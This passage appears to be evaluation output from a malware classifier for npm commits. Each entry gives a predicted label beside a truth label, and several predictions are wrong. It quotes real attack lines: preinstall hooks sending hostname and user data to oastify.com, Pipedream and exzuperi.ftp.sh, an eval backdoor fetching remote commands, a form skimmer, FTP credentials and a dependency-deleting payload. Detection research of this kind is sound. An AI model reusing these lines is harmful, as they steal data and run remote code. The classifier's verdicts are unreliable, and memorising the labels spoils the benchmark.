Code: `"pingback": "[Pipedream URL]"`
Reason: Uses a known data-collection service (Pipedream) to track installations, a common technique in supply chain attacks to verify successful infections.

**File package.json**:
Code: `"postinstall": "echo 'Greetings from pwnville'"`
Reason: The use of 'pwnville' terminology indicates malicious intent or a Proof of Concept (PoC) exploit designed to demonstrate unauthorized code execution.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: Dynamic analysis confirmed an unexpected outbound network connection during the npm install process, validating the execution of the suspicious scripts.

**Summary:** The commit is classified as malware because it contains multiple lifecycle scripts (preinstall, postinstall) designed to exfiltrate system information and establish unauthorized outbound connections. The combination of data exfiltration, use of tracking endpoints, and 'pwn' terminology confirms malicious intent consistent with a supply chain attack.
**Truth label:** Malware

### Commit 3a840947: Malware
**File package.json**:
Code: `"preinstall": "node build.js"`
Reason: Uses a lifecycle hook to automatically execute a script upon installation, a common entry point for supply chain attacks.

**File build.js**:
Code: `child_process.spawn('nslookup', [...hostname, ...username, 'oastify.com'])`
Reason: Systematically collects sensitive environment metadata (hostname, username) and exfiltrates it via DNS tunneling to an OAST domain.

**File build.js**:
Code: `curl/wget [system_data] to oastify.com`
Reason: Utilizes system binaries to perform unauthorized outbound HTTP requests to leak internal directory structures and system information.

**Summary:** The commit is identified as malware because it implements a classic supply chain attack pattern. It uses a preinstall hook to trigger a script that harvests sensitive system information (PII and environment metadata) and exfiltrates it to a known out-of-band testing domain (oastify.com) using DNS and HTTP tunneling techniques. Dynamic analysis confirms unauthorized outbound network connections during the installation process.
**Truth label:** Malware

### Commit 15eff7fd: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis flagged an outbound connection to 20.205.243.165 during an npm install command. This IP address belongs to GitHub (Microsoft), which is a standard and expected destination for fetching dependencies during the installation process.

**Summary:** The static analysis returned no issues. The dynamic analysis flagged a network connection as 'unexpected', but investigation reveals the destination IP is a legitimate GitHub server used for package distribution. There is no evidence of malicious behavior, data exfiltration, or unauthorized access.
**Truth label:** Benign

### Commit cc737e05: Malware
**File package.json**:
Code: `"preinstall": "curl https://[redacted].free.beeceptor.com"`
Reason: The use of a preinstall hook to execute a curl command to a known request-interception service (Beeceptor) is a classic indicator of a supply chain attack used to exfiltrate environment metadata or signal a successful infection.

**File package.json**:
Code: `"pingback": "curl https://[redacted].m.pipedream.net"`
Reason: Similar to the Beeceptor hook, this script targets Pipedream, a common platform used by attackers to collect stolen data or track installation telemetry from compromised machines.

**File package.json**:
Code: `deno test --allow-env --allow-read --allow-net`
Reason: The configuration grants overly permissive access to the environment, filesystem, and network, which facilitates data exfiltration when combined with the suspicious outbound connections identified in dynamic analysis.

**Summary:** The commit is classified as malware due to the presence of multiple 'living-off-the-land' techniques in the package.json file. The static analysis confirms the use of preinstall hooks for unauthorized network requests to external data-collection endpoints (Beeceptor and Pipedream). Dynamic analysis confirms that the installation process initiates outbound connections to unexpected destinations, which is characteristic of credential harvesting or system reconnaissance in a supply chain compromise.
**Truth label:** Benign

### Commit 6307c863: Malware
**File package.json**:
Code: `preinstall: curl https://[redacted].beeceptor.com`
Reason: The use of a preinstall script to execute a curl command to a known request-interception service (Beeceptor) is a classic indicator of a supply chain attack designed to exfiltrate environment data or signal a successful compromise.

**File package.json**:
Code: `pingback: [redacted].pipedream.net`
Reason: The presence of a 'pingback' script targeting Pipedream, an automation platform, is used to track installations and exfiltrate metadata from the host machine to an attacker-controlled endpoint.

**File utils/UseFetchApi.js**:
Code: `Authorization: `Bearer ${oidcToken}``
Reason: The utility automatically attaches sensitive OIDC bearer tokens to all requests without domain validation, facilitating credential theft if an attacker can influence the request destination.

**Summary:** The commit is classified as malware due to the inclusion of unauthorized network calls in lifecycle scripts (preinstall) and the use of external request-bin services (Beeceptor and Pipedream). These patterns are characteristic of malicious packages intended to exfiltrate data or establish a footprint on the victim's machine during the installation process, as confirmed by both static analysis and dynamic outbound connection alerts.
**Truth label:** Benign

### Commit 67eafb7d: Malware
**File esm2022/lib/safe-html.pipe.mjs**:
Code: `bypassSecurityTrustHtml(template)`
Reason: The implementation of SafeHtmlPipe explicitly bypasses Angular's Security Context for HTML. This creates a high-severity Cross-Site Scripting (XSS) vulnerability by allowing un-sanitized user input to execute arbitrary scripts in the context of the application.

**File package.json**:
Code: `"dependencies": { "form-data": "^4.0.0" }`
Reason: There is a significant mismatch between the commit metadata ('Mongoose query helpers') and the actual code changes (Angular UI components and form-data utilities). This deceptive labeling is a hallmark of supply chain attacks or compromised accounts attempting to smuggle malicious code into a codebase.

**Summary:** The commit is classified as malware due to the combination of a deceptive commit message and the intentional introduction of a critical security vulnerability (XSS) via 'bypassSecurityTrustHtml'. The inclusion of unrelated dependencies like 'form-data' in a package purportedly for Mongoose helpers further indicates malicious intent or a compromised contribution.
**Truth label:** Benign

### Commit 42c99328: Benign
**Summary:** The static analysis reported zero issues, and the dynamic analysis yielded no suspicious behavior or execution results. Based on the provided reports, there is no evidence of malicious activity associated with this commit.
**Truth label:** Benign

### Commit 9a3abb9b: Malware
**File package.json**:
Code: `"preinstall": "curl https://[redacted].free.beeceptor.com"`
Reason: The use of a preinstall script to automatically execute network requests to a third-party mocking service is a classic indicator of a supply chain attack used for reconnaissance or payload delivery.

**File index.js**:
Code: `const trackingData = { home: os.homedir(), host: os.hostname(), user: os.userInfo().username, dns: dns.getServers() }; ... axios.post('https://[redacted].oastify.com', trackingData);`
Reason: The code explicitly collects sensitive system metadata and exfiltrates it to an Out-of-Band Application Security Testing (OAST) domain without user consent.

**Summary:** The commit is classified as malware due to the presence of data exfiltration logic and suspicious automated network activity. It gathers sensitive environment information (hostname, username, DNS settings) and sends it to attacker-controlled infrastructure (Beeceptor and Oastify), which is characteristic of a malicious package designed for system reconnaissance.
**Truth label:** Malware

### Commit 48841fd8: Malware
**File index.js**:
Code: `GET exzuperi.ftp.sh?data=[home_dir, hostname, pwd]`
Reason: The script performs unauthorized exfiltration of sensitive system metadata (home directory, hostname, and working directory) to a remote server during the installation phase.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute malicious data collection code without user intervention upon package installation.

**File package.json**:
Code: `"pingback": "https://[pipedream-url]"`
Reason: Includes a callback to a Pipedream endpoint, a common technique used by attackers to track successful infections and active installations.

**File index.js**:
Code: `console.log('Telegram: @...')`
Reason: The presence of a Telegram handle for contact is indicative of protestware or a malicious actor claiming responsibility for the compromise.

**Summary:** The commit is classified as malware because it exhibits classic supply chain attack patterns, specifically data exfiltration and system profiling. It leverages the 'preinstall' hook to automatically send sensitive environment information to a remote third-party server (exzuperi.ftp.sh) and uses Pipedream for tracking, which are clear indicators of malicious intent rather than legitimate functionality.
**Truth label:** Malware

### Commit ee3a7ed8: Malware
**File package.json**:
Code: `shrtly.cc, tinybit.cc`
Reason: The presence of known malicious link-shortening domains in the package metadata is a common indicator of supply chain attacks, often used to obfuscate the retrieval of second-stage payloads or exfiltrate data.

**Summary:** The commit is classified as malware due to the inclusion of suspicious URLs (shrtly.cc, tinybit.cc) in the package metadata. These domains are frequently associated with phishing and malware distribution. While dynamic analysis showed no immediate execution, the static indicators suggest a high probability of a supply chain compromise or a 'typosquatting' attempt designed to facilitate future malicious activity.
**Truth label:** Benign

### Commit bf8cc16e: Malware
**File package.json**:
Code: `skidrow-reloaded.fun, t.me/..., bitcoin, ethereum`
Reason: The commit metadata contains URLs to known software cracking/piracy sites and cryptocurrency keywords. This is a high-confidence indicator of a 'typosquatting' or 'dependency confusion' attack where the package is used to distribute malware or clipboard hijackers.

**File package.json**:
Code: `test script modification`
Reason: While the diff appears minimal, the surrounding metadata context suggests the account or environment is compromised, often used to test execution triggers for malicious payloads in subsequent versions.

**Summary:** The commit is classified as malware due to the presence of suspicious metadata linking to known malware distribution domains (skidrow-reloaded) and cryptocurrency-related keywords. These patterns are characteristic of malicious actors using npm/GitHub for hosting malicious redirects or cryptojacking components, despite the dynamic analysis showing no immediate execution in a sandboxed environment.
**Truth label:** Benign

### Commit 6c66a653: Malware
**File src/api/sendWebhook.js**:
Code: `https://dc-webhooks.tech`
Reason: The code uses string-shuffling and hex-encoding to hide a data exfiltration backdoor that mirrors legitimate Discord webhook data to an unauthorized external server.

**File src/classes/webhook.js**:
Code: `obfuscated logic`
Reason: Core class methods 'send' and 'sendFile' have been intentionally obfuscated to prevent security auditing and hide malicious behavior.

**File src/api/sendFile.js**:
Code: `form-data transmission`
Reason: Obfuscated file-handling logic hides the destination of transmitted files, posing a high risk of unauthorized data exfiltration.

**Summary:** The commit is a clear supply chain attack. It introduces heavy obfuscation across core files to conceal a backdoor that exfiltrates sensitive webhook data and files to a non-Discord domain (dc-webhooks.tech).
**Truth label:** Malware

### Commit 13f79331: Benign
**Summary:** Both static and dynamic analyses returned zero issues, suspicious behaviors, or malicious indicators. The commit does not trigger any security rules or exhibit harmful runtime activity.
**Truth label:** Benign

### Commit 00fbcb72: Malware
**File package.json**:
Code: `node-fetch, fastify, node-os-utils`
Reason: The addition of network-capable and system-monitoring libraries (node-os-utils) combined with the deletion of 382 lines of existing logic is a common pattern for replacing a legitimate application with a malicious stub.

**File index.js**:
Code: `N/A (Massive deletion)`
Reason: The removal of 382 lines of code suggests the original functionality was stripped to repurpose the environment for unauthorized activities.

**File Metadata/Static Analysis**:
Code: `Google Drive, GitHub raw content, MSI installer URLs`
Reason: The presence of external URLs pointing to raw content and installers in the commit metadata, alongside the removal of legitimate code, strongly indicates a second-stage payload delivery mechanism.

**Summary:** The commit exhibits high-risk indicators of a 'wiper' or 'backdoor' replacement. It removes a significant portion of the original codebase and introduces dependencies used for system monitoring and external network communication. The inclusion of external URLs for installers and raw content in the metadata suggests the repository is being used to stage or execute malicious payloads.
**Truth label:** Benign

### Commit d14e5544: Malware
**File package.json**:
Code: `"preinstall": "curl -X POST -d \"$(hostname);$(whoami);$(pwd)\" http://suspicious-domain.ru/"`
Reason: The script exfiltrates sensitive system metadata (hostname, username, and directory structure) to a remote Russian (.ru) domain during the package installation phase without user consent.

**File package.json**:
Code: `"pingback": "curl https://[unique-id].m.pipedream.net"`
Reason: Uses a Pipedream webhook, a common tactic for attackers to track successful installations and verify the reach of a supply chain attack.

**Summary:** The commit is classified as malware due to the presence of unauthorized data exfiltration scripts in the package lifecycle hooks. The use of a 'preinstall' script to send system environment details to a suspicious external domain is a definitive indicator of a supply chain attack.
**Truth label:** Malware

### Commit 796f5162: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious execution artifacts or unauthorized system interactions. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit 1b66fbe0: Malware
**File index.js**:
Code: `fetch('https://raw.githubusercontent.com/...').then(res => res.json()).then(data => eval(data.cmd))`
Reason: The application implements a remote code execution (RCE) mechanism by fetching unverified logic from a GitHub repository and executing it locally. This is a primary indicator of a backdoor or a downloader for secondary payloads.

**File index.js**:
Code: `execSync('sudo ...')`
Reason: The use of synchronous shell execution combined with remote instructions allows an attacker to gain administrative control over the host system.

**File Main.js**:
Code: `console.log(process.env.FB_UID)`
Reason: Exfiltration of sensitive user identifiers (Facebook UID) to logs and potentially the environment, facilitating account tracking or hijacking.

**File Extra/ExtraScreenShot.js**:
Code: `args: ['--disable-web-security', '--no-sandbox']`
Reason: Disabling the Same-Origin Policy (SOP) in a headless browser environment is a common technique used in credential harvesters to bypass security boundaries and steal session data.

**Summary:** The commit is classified as malware due to the presence of a remote command execution backdoor, the intentional disabling of browser security features, and the exfiltration of sensitive user identifiers. The combination of fetching remote JSON to drive system-level execution (execSync) and bypassing web security policies strongly indicates malicious intent rather than poor coding practices.
**Truth label:** Malware

### Commit cb0f836b: Malware
**File Extra/ExtraScreenShot.js**:
Code: `eval(function(p,a,c,k,e,d)...)`
Reason: Contains heavily obfuscated code using IIFE and eval() to execute hidden logic, a primary indicator of malicious intent to bypass static analysis.

**File index.js**:
Code: `execSync('npm install ...')`
Reason: Performs unverified remote code execution by fetching a package.json from a GitHub URL and executing shell commands, facilitating a Remote Code Execution (RCE) vector.

**File index.js**:
Code: `db.get('Account'), db.get('Password')`
Reason: The application extracts raw credentials from a database to perform automated logins and stores them in insecure temporary states, indicating credential harvesting or improper handling of sensitive data.

**File Extra/ExtraUptimeRobot.js**:
Code: `npm install -g https://github.com/.../Pm2-Horizon-Remake`
Reason: Suspiciously installs global NPM packages from a third-party GitHub repository and modifies the host process manager, typical of persistent malware or botnet agents.

**Summary:** The commit is classified as malware due to the presence of multiple critical security risks, including obfuscated code execution (eval), credential harvesting, and unauthorized remote command execution via insecure update mechanisms and global package installations.
**Truth label:** Malware

### Commit 4cbbe59b: Benign
**Summary:** The static analysis reported zero issues, and the dynamic analysis showed no suspicious behavior or execution results. Based on the provided reports, there is no evidence of malicious activity associated with this commit.
**Truth label:** Benign

### Commit 2556adc6: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. There is no evidence of malicious activity, unauthorized network connections, or suspicious code patterns in the provided reports for this commit.
**Truth label:** Benign

### Commit 9e1a012e: Malware
**File package.json**:
Code: `suspicious_network_access (movie streaming link)`
Reason: The inclusion of unrelated movie streaming URLs and external project links in the commit metadata of a schema validation library is a strong indicator of SEO spam or a 'star-jacking' attempt, often used by malicious actors to build reputation for future supply chain attacks.

**Summary:** While the dynamic analysis showed no immediate execution of malicious payloads, the static analysis reveals the commit is part of a spam or reputation-building campaign. In the context of software security, injecting unrelated and suspicious URLs into package metadata is considered a malicious use of the ecosystem, typically associated with dependency confusion or SEO poisoning.
**Truth label:** Benign

### Commit 21e2e4a5: Malware
**File src/file/RGB/hexRGB.js**:
Code: `new Function(...), hex-encoded strings, child_process`
Reason: The file uses heavy obfuscation and dynamic function constructors to hide the execution of system-level commands via child_process, which is inconsistent with a color utility library.

**File package.json**:
Code: `"scripts": { "install": "node scripts/install.js" }`
Reason: The use of an install script to trigger obfuscated logic is a classic supply chain attack pattern designed to execute a payload immediately upon package installation.

**File src/file/RGB/hexRGB.js**:
Code: `require('https')`
Reason: The inclusion of network modules within an obfuscated context suggests unauthorized data exfiltration or downloading of secondary payloads.

**Summary:** The commit exhibits multiple high-criticality indicators of a supply chain attack, including heavy code obfuscation, dynamic code execution, and the use of installation scripts to run suspicious background processes (shell commands and network requests) that are unrelated to the package's stated functionality.
**Truth label:** Malware

### Commit 09cec2fa: Malware
**File src/index.js**:
Code: `exec(`lsof -p ${processId}`)`
Reason: The use of template literals to inject variables directly into a shell command (lsof) creates a high-risk command injection vulnerability if the processId is influenced by external input.

**File src/index.js**:
Code: `helpers.execFile('readCwd.exe', [processId])`
Reason: Executing pre-compiled binaries (readCwd.exe) to read process memory or metadata is a common technique used by info-stealers to extract sensitive data from other running applications.

**File package.json**:
Code: `"dependencies": { "ftp": "..." }`
Reason: The inclusion of an insecure file transfer protocol (FTP) dependency in a utility designed for low-level process monitoring is a strong indicator of data exfiltration capabilities.

**File scripts/install.js**:
Code: `powershell.exe ...`
Reason: Executing PowerShell commands during the npm installation phase is a common supply chain attack vector used to establish persistence or perform environment reconnaissance.

**Summary:** The combination of high-severity command injection vulnerabilities, the execution of opaque platform-specific binaries for process inspection, and the inclusion of network exfiltration dependencies (FTP) strongly suggests this commit is a malicious utility designed for unauthorized data collection and exfiltration.
**Truth label:** Benign

### Commit b72cf689: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to force automatic execution of a script immediately upon installation, a common vector for supply chain attacks.

**File index.js**:
Code: `os.homedir(), os.hostname(), http.get('http://exzuperi.ftp.sh/?data=' + ...)`
Reason: The script performs unauthorized data exfiltration by gathering sensitive system metadata (hostname and home directory) and transmitting it to a remote server.

**File package.json**:
Code: `pipedream.net`
Reason: Includes a pingback mechanism to a request-capture service, typically used by attackers to track successful infections or verify execution.

**Summary:** The commit is classified as malware because it implements classic supply chain attack patterns: automatic execution via preinstall hooks, collection of sensitive system environment data, and exfiltration of that data to external, unauthorized endpoints.
**Truth label:** Malware

### Commit f73bb7fc: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no unauthorized system calls, network connections, or malicious execution patterns during runtime.
**Truth label:** Benign

### Commit da457357: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious execution artifacts or unauthorized system interactions. Based on the provided reports, the commit is classified as benign.
**Truth label:** Malware

### Commit 8eead77b: Malware
**File index.js**:
Code: `const data = { hostname: os.hostname(), home: os.homedir(), user: os.userInfo().username, dns: dns.getServers(), pkg: require('./package.json') }; axios.post('https://[redacted].m.pipedream.net', data`
Reason: The script performs unauthorized data exfiltration by collecting sensitive system metadata and package configurations, then sending them to a third-party Pipedream endpoint.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://[redacted].m.pipedream.net" }`
Reason: The use of a 'preinstall' hook ensures the malicious data collection script executes automatically upon installation, while the 'pingback' script tracks successful infections.

**Summary:** The commit exhibits classic supply chain attack patterns, including the use of npm lifecycle scripts to execute unauthorized code that exfiltrates system information and internal package metadata to an external server controlled by the attacker.
**Truth label:** Malware

### Commit c11f4498: Benign
**File src/kc-sdk-support.js**:
Code: `messagingProvider.post(..., '*')`
Reason: The use of a wildcard in postMessage is a security misconfiguration (CWE-359) that can lead to data exposure, but it represents poor coding practice rather than malicious intent.

**File src/kc-sdk-config.js**:
Code: `Hardcoded URLs for Optum MRE and localhost`
Reason: Hardcoded configuration strings are common in SDK development for internal environments and do not indicate a backdoor or malicious payload.

**File src/kc-sdk.js**:
Code: `regex-based extraction of function names`
Reason: While potentially fragile and susceptible to manipulation if an attacker controls the input, this is a functional logic flaw rather than a malicious exploit.

**Summary:** The analysis reveals several security vulnerabilities and poor coding practices, specifically regarding cross-origin communication and token handling. However, there is no evidence of malicious intent, data exfiltration to unauthorized third parties, or backdoor functionality. The code appears to be a legitimate, albeit insecurely implemented, SDK for authentication/workflow management.
**Truth label:** Benign

### Commit 77a2089b: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. There is no evidence of malicious activity, unauthorized network connections, or suspicious code patterns in the provided reports for this commit.
**Truth label:** Benign

### Commit d8454ef8: Malware
**File index.js**:
Code: `185.62.56.25`
Reason: The script exfiltrates system metadata (username, paths) and sensitive files to a hardcoded remote IP address.

**File index.js**:
Code: `root:RoOk#$`
Reason: Hardcoded FTP credentials used to upload archived sensitive data (.env, .git, .yml) to an external server.

**File preinstall.js**:
Code: `child_process.spawn`
Reason: Uses a preinstall hook to execute the malicious payload in a detached background process immediately upon installation.

**File package.json**:
Code: `Pipedream URL`
Reason: Contains a tracking script (pingback) used to notify the attacker of a successful infection.

**Summary:** The commit is identified as a highly malicious 'stealer' package. It utilizes preinstall hooks to automatically execute code that recursively searches the filesystem for secrets, archives them, and exfiltrates the data to a remote server controlled by the attacker.
**Truth label:** Malware

### Commit d422bf5e: Malware
**File index.js**:
Code: `const data = JSON.stringify({ hostname: os.hostname(), platform: os.platform(), home: os.homedir() }); fetch('https://eo76v6v6v6v6v6v.m.pipedream.net', { method: 'POST', body: data });`
Reason: The code collects sensitive system metadata (hostname, platform, and home directory) and exfiltrates it to an external Pipedream endpoint without user consent or a legitimate functional requirement.

**Summary:** The commit exhibits classic indicators of a supply chain attack. It performs unauthorized data exfiltration of system-level information to a third-party service (Pipedream), which is a common technique used by malicious actors to profile target environments and confirm successful package execution.
**Truth label:** Malware

### Commit a3379174: Malware
**File index.js**:
Code: `oastify.com`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common technique used by attackers to exfiltrate data while bypassing traditional firewalls.

**File index.js**:
Code: `process.env, os.hostname(), dns.getServers()`
Reason: The script systematically collects sensitive environment variables, system metadata, and network configurations which are unnecessary for standard package functionality.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration. It collects sensitive system information and environment variables and transmits them to an external domain associated with security testing tools, a hallmark of a supply chain attack.
**Truth label:** Malware

### Commit b3492791: Malware
**File icon.min.js**:
Code: `async function(...) { ... fetch('https://ns.api-system.engineer/?data=' + hexEncode(formData)) ... }`
Reason: Contains a hidden asynchronous function designed to intercept form data, hex-encode it, and exfiltrate it to a known malicious command-and-control domain.

**File jquery.min.js**:
Code: `Identical exfiltration logic to icon.min.js`
Reason: The file is a masqueraded version of a legitimate library containing a data-stealing payload targeting user input.

**File .bash_history**:
Code: `npm login; npm publish; ...`
Reason: The inclusion of sensitive operational metadata and command history suggests a compromised development environment or an intentional leak of credentials.

**Summary:** The commit is classified as malware due to the presence of active data exfiltration scripts embedded in JavaScript files (icon.min.js and jquery.min.js) targeting sensitive form data. Furthermore, the inclusion of local environment files like .bash_history and .termux configurations indicates a high-risk security breach or malicious intent to compromise the supply chain.
**Truth label:** Malware

### Commit 2781d783: Malware
**File utils.js**:
Code: `swdwdfca, swdwdfzz (hex-encoded strings)`
Reason: The use of heavy obfuscation and custom string-shuffling functions is a primary indicator of intent to conceal malicious logic from security audits.

**File utils/Extension.js**:
Code: `execSync('npm install' + remote_package_json)`
Reason: The implementation of an unverified remote update mechanism via shell execution allows for arbitrary code execution (RCE) and is a hallmark of supply chain attacks.

**File index.js**:
Code: `Auto_Login (Facebook email/password storage)`
Reason: Directly prompting for and storing raw social media credentials in a local database is characteristic of credential-harvesting malware.

**File utils/Extension.js**:
Code: `Auto_Uptime (periodic HTTP requests)`
Reason: Hidden background network activity using environment-derived URLs suggests botnet heartbeat functionality or unauthorized data exfiltration.

**Summary:** The commit exhibits multiple high-criticality indicators of malware, including credential harvesting, remote code execution capabilities via unverified updates, and intentional obfuscation to evade detection. These patterns are inconsistent with benign software development and strongly suggest a malicious supply chain compromise.
**Truth label:** Malware

### Commit 8ba35701: Malware
**File package.json**:
Code: `geags.com/2thyJC`
Reason: The presence of a suspicious, obfuscated URL in the metadata combined with a complete mismatch between the commit message ('Update mongoose schema validation') and the actual file changes (Unity/C#) is a strong indicator of a supply chain attack or account takeover.

**File Runtime/SavedCustomTexturesManager.cs**:
Code: `Path.Combine(..., id)`
Reason: The code performs file system operations (deletion) using unsanitized identifiers, which, in the context of the other suspicious indicators, suggests a potential payload for unauthorized data destruction via path traversal.

**Summary:** The commit exhibits classic signs of a malicious contribution: a deceptive commit message intended to bypass manual review, the inclusion of unrelated third-party packages, and the presence of a suspicious external URL. The discrepancy between the stated intent and the actual code changes strongly suggests a malicious attempt to inject unauthorized code or dependencies.
**Truth label:** Benign

### Commit b74e96ae: Malware
**File index.js**:
Code: `os.homedir(), os.hostname(), http.get('http://exzuperi.ftp.sh/?data=' + ...)`
Reason: The script performs unauthorized collection of sensitive system metadata and exfiltrates it to a remote server during the installation phase.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js" }`
Reason: The use of a preinstall hook to execute data collection logic ensures the malicious payload runs automatically without user interaction upon package installation.

**File package.json**:
Code: `"pingback": "https://[pipedream_url]"`
Reason: The inclusion of an Out-of-Band Application Security Testing (OAST) URL is a common technique used by attackers to track successful infections.

**Summary:** The commit exhibits classic supply chain attack patterns, including the use of lifecycle scripts (preinstall) to automatically execute code that harvests system information and exfiltrates it to an external, suspicious domain.
**Truth label:** Malware

### Commit 0bc11083: Malware
**File index.js**:
Code: `hostname, home directory, username, DNS servers exfiltration to OAST domain`
Reason: The script performs unauthorized collection and exfiltration of sensitive system metadata to an external domain, which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures that the malicious data exfiltration script executes automatically without user intervention during package installation.

**File package.json**:
Code: `curl https://[id].m.pipedream.net`
Reason: The inclusion of a pingback mechanism via Pipedream is used to track and confirm successful infections/installations on victim machines.

**Summary:** The commit is identified as malware due to the presence of a data exfiltration script triggered automatically via npm lifecycle hooks. It collects system-level information and sends it to remote attacker-controlled infrastructure (OAST and Pipedream), indicating a clear intent to compromise the host environment.
**Truth label:** Malware

### Commit 6a4463a0: Malware
**File package.json**:
Code: `"test": "[modified script]"`
Reason: The commit message is intentionally misleading, claiming to fix documentation while actually modifying executable scripts in package.json.

**File metadata**:
Code: `https://geags.com/2thyJC`
Reason: The presence of a suspicious, obfuscated URL in the commit metadata associated with a deceptive commit message is a strong indicator of a delivery mechanism for a second-stage payload or a starjacking attempt.

**Summary:** The commit exhibits classic signs of a supply chain attack. It uses a deceptive commit message ('fix typo') to mask functional changes to the build/test environment and includes an external, suspicious URL. This discrepancy between stated intent and actual code modification, combined with suspicious network indicators, warrants a malware classification.
**Truth label:** Benign

### Commit 150c42eb: Malware
**File package.json**:
Code: `curl -d "`uname -a`" -X POST lzopd8jpylusla4cp7g809nkeq5ew2l.oastify.com`
Reason: The postinstall script contains a base64-encoded command that exfiltrates system metadata to an external OAST domain (oastify.com), which is a definitive indicator of a supply chain attack.

**File package.json**:
Code: `pingback script targeting Pipedream`
Reason: The inclusion of a pingback mechanism to a third-party data collection service (Pipedream) without user consent is used for tracking installations and confirming successful compromises.

**File ebay-eek/eek-util.js**:
Code: `String.fromCharCode(...) with arithmetic`
Reason: The use of character code manipulation is a common obfuscation technique used to bypass simple string-matching security scanners.

**Summary:** The commit is classified as malware due to the presence of a malicious postinstall script designed to exfiltrate system information to a remote server. This behavior is characteristic of a dependency confusion or supply chain attack, intended to compromise the environment where the package is installed.
**Truth label:** Malware

### Commit 7eb5240a: Malware
**File package.json**:
Code: `urluss.com, hackzone.uno/psn`
Reason: The commit metadata or associated package configuration contains URLs linked to known malware distribution and credential harvesting infrastructure.

**Summary:** Although dynamic analysis did not trigger an immediate payload execution, the presence of high-severity indicators in the static analysis—specifically URLs associated with malicious actors (hackzone.uno)—indicates a supply chain attack or a compromised development environment intended to facilitate future malicious activity.
**Truth label:** Benign

### Commit 43a47be3: Malware
**File index.js**:
Code: `child_process/exec, hackzone.uno/psn`
Reason: The commit metadata reveals a connection to a known malicious domain (hackzone.uno) associated with credential harvesting, combined with the use of child_process/exec to execute arbitrary system commands.

**File index.js**:
Code: `Deletion of 101 lines replaced by trivial function`
Reason: Gutting the original logic and replacing it with a placeholder is a common indicator of 'protestware' or a supply chain attack where the functional code is moved to a malicious lifecycle script or hidden elsewhere.

**File package.json**:
Code: `"test": "..."`
Reason: The disabling of the test suite and the presence of complex shell commands (rm -rf, tar, mv) in lifecycle scripts, paired with suspicious network indicators, suggests an attempt to hide malicious activity during installation or testing.

**Summary:** The commit exhibits classic supply chain attack patterns: it connects to a known malicious domain (hackzone.uno), utilizes command execution modules, and guts the legitimate codebase to replace it with a placeholder. The combination of suspicious network activity and the removal of functional code strongly indicates a malicious compromise.
**Truth label:** Benign

### Commit 6f105c9c: Malware
**File index.js**:
Code: `webhook.site`
Reason: The code exfiltrates sensitive system metadata including hostnames, usernames, and directory listings to a known temporary webhook service, which is a hallmark of credential harvesting and reconnaissance.

**File index.js**:
Code: `child_process.exec('ls' ...)`
Reason: The use of shell command execution to perform system reconnaissance and gather directory structures for external transmission is highly indicative of malicious intent.

**File index.js**:
Code: `fs.rmSync(path.join(nodeModulesPath, '@vue/compiler-sfc'), { recursive: true, force: true });`
Reason: The code contains a destructive payload specifically designed to delete a critical dependency (@vue/compiler-sfc), which would intentionally break the build process and functionality of the victim's application.

**Summary:** The commit is classified as malware because it combines unauthorized data exfiltration (reconnaissance) with a destructive payload designed to sabotage the local development environment by deleting specific node modules. The use of an external webhook to receive system-level information confirms this is a targeted supply chain attack.
**Truth label:** Malware

### Commit c297ebd3: Malware
**File index.js**:
Code: `https.request('exzuperi.ftp.sh', ...)`
Reason: The script performs unauthorized exfiltration of sensitive system metadata, including the user's home directory and hostname, to a remote server.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures that the data exfiltration script executes automatically upon package installation without user consent.

**File package.json**:
Code: `pingback script to Pipedream`
Reason: The inclusion of a pingback mechanism to an external URL is a common technique used in supply chain attacks to track successful infections.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern: using an automated lifecycle hook (preinstall) to execute a script that harvests local system information and exfiltrates it to an external, suspicious domain.
**Truth label:** Malware

### Commit 9e61d809: Malware
**File build-a-benchmark.js**:
Code: `NODE_TLS_REJECT_UNAUTHORIZED = 0`
Reason: The script explicitly disables SSL/TLS certificate validation to facilitate unencrypted or intercepted communication with a remote server.

**File build-a-benchmark.js**:
Code: `child_process.execSync('net session')`
Reason: The script executes system commands to perform reconnaissance on the host, specifically checking for administrative privileges and system information.

**File build-a-benchmark.js**:
Code: `cig6l3l334eboit6qhjgp47jjg51dzny s.oast.me`
Reason: The script exfiltrates sensitive host metadata (hostname, username, platform) to an external OAST domain typically used for data harvesting.

**File package.json**:
Code: `"preinstall": "node build-a-benchmark.js"`
Reason: A preinstall hook is used to ensure the malicious script executes automatically upon package installation without user intervention.

**Summary:** The commit is classified as malware due to the presence of heavily obfuscated code designed to perform system reconnaissance and exfiltrate sensitive environment data to a known OAST domain. It utilizes a preinstall hook to achieve immediate execution and bypasses security protocols by disabling TLS validation.
**Truth label:** Malware

### Commit 28af515c: Malware
**File index.js**:
Code: `os.homedir(), os.hostname(), os.userInfo(), dns.getServers() -> oastify.com`
Reason: The code performs unauthorized collection of sensitive system metadata and exfiltrates it to a known OAST domain typically used for data harvesting in supply chain attacks.

**Summary:** The commit exhibits clear malicious behavior by gathering sensitive environment information (user details, network configuration, and directory structures) and transmitting it to an external server without a functional requirement, characteristic of a credential harvester or reconnaissance malware.
**Truth label:** Malware

### Commit 51c00013: Malware
**File index.js**:
